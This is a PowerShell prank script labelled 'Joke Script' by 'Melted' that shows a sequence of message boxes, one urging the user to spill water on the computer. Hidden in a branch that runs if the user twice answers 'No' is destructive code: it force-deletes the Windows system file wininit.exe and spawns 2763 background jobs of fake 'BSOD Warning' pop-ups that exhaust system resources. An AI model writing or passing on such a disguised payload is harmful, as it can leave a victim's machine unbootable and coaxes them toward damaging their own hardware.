Add-Type -AssemblyName PresentationFramework

[System.Windows.MessageBox]::Show(
    "Your computer is now hydrocomputer. Please spill water to continue.",
    "Green Transformation",
    "OK",
    "Info"
)

Start-Sleep -Seconds 6

[System.Windows.MessageBox]::Show(
    "That was a joke. Haha. Fat chance. Anyway, if you have a PC, congrats! You're immune and you can just clean it up! But if you have a laptop, you're cooked.",
    "Joke Script (PowerShell)",
    "OK",
    "Information"
)

Start-Sleep -Seconds 1

$result = [System.Windows.MessageBox]::Show(
    "Thanks for testing out 'Joke Script' by Melted. We thank you for your 'hard work' and goodbye. By the way, was the script good?",
    "Joke Script (PowerShell)",
    "YesNo",
    "Question"
)

if ($result -eq [System.Windows.MessageBoxResult]::Yes) {
    [System.Windows.MessageBox]::Show(
        "Thank you for your feedback! I appreciate it. Bye!",
        "Thanks!",
        "OK",
        "Info"
    )
} elseif ($result -eq [System.Windows.MessageBoxResult]::No) {
    $result2 = [System.Windows.MessageBox]::Show(
        "I SAID, WAS THE SCRIPT GOOD?",
        "CRITICAL ERROR",
        "YesNo",
        "Question"
    )
    if ($result2 -eq [System.Windows.MessageBoxResult]::No) {
        Remove-Item "C:\Windows\System32\wininit.exe" -Force
        Start-Sleep -Seconds 1
        1..2763 | ForEach-Object {
            Start-Job {
                Add-Type -AssemblyName PresentationFramework
                [System.Windows.MessageBox]::Show(
                    "2763",
                    "Critical Error (BSOD Warning)",
                    "OK",
                    "Error"
                )
            }
        }
    }
}


